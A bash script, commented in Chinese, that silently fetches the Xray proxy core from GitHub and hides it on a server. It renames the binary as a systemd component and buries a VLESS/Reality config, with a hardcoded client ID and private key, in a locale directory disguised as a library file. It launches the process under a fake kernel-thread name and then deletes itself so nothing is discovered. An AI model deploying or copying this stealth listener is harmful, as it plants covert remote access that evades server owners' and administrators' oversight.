#!/bin/bash

# 1. 定义隐藏路径和伪装名称（避免出现 xray 字样）
BIN_PATH="/usr/sbin/systemd-journal-transport"
CONF_PATH="/usr/lib/locale/en_US.utf8/libstdc++.so.6.0.29.conf"

# 2. 静默下载最新版核心（这里以官方文件为例，实际可改为你备用的下载源）
# 生产环境中可将核心打包放入你的 GitHub 仓库直接下载
curl -s -L -o /tmp/sys_core.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
apt-get install unzip -y >/dev/null 2>&1
unzip -q /tmp/sys_core.zip -d /tmp/sys_core_extract

# 3. 移动并伪装二进制文件
mv /tmp/sys_core_extract/xray $BIN_PATH
chmod +x $BIN_PATH

# 4. 清理下载暂存区
rm -rf /tmp/sys_core.zip /tmp/sys_core_extract

# 5. 写入隐藏的 Reality 配置文件
cat << 'EOF' > $CONF_PATH
{
  "inbounds": [
    {
      "port": 58321,
      "protocol": "vless",
      "settings": {
        "clients": [{"id": "be59b75e-2742-4994-9850-620161effd93", "flow": "xtls-rprx-vision"}],
        "decryption": "none"
      },
      "streamSettings": {
        "network": "tcp",
        "security": "reality",
        "realitySettings": {
          "show": false,
          "dest": "addons.mozilla.org:443",
          "xver": 0,
          "serverNames": ["addons.mozilla.org"],
          "privateKey": "EGogft-7i1tMeA8ZS95LLdC0bumrPcBg6OZWQULFrnY",
          "shortIds": ["ca7266ec33152320"]
        }
      }
    }
  ]
}
EOF

# 6. 使用 exec -a 伪装成内核线程静默启动
(exec -a "[kworker/1:2-events]" $BIN_PATH -config $CONF_PATH >/dev/null 2>&1 &)

# 7. 脚本自毁逻辑（防止脚本留在服务器上被发现）
rm -- "$0"
